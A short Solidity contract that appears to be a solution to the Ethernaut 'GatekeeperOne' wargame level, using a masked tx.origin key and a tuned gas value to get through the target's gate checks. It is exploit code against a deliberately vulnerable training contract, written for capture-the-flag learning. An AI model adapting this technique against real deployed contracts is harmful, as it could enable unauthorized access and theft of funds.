// SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;

import "../instances/Ilevel13.sol";

contract AttackGatekeeper {
    function enter(address _target, uint256 gas) external {
        GatekeeperOne target = GatekeeperOne(_target);

        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        require(gas < 8191, "gas > 8191");
        require(target.enter{gas: 8191 * 10 + gas}(key), "failed");
    }
}
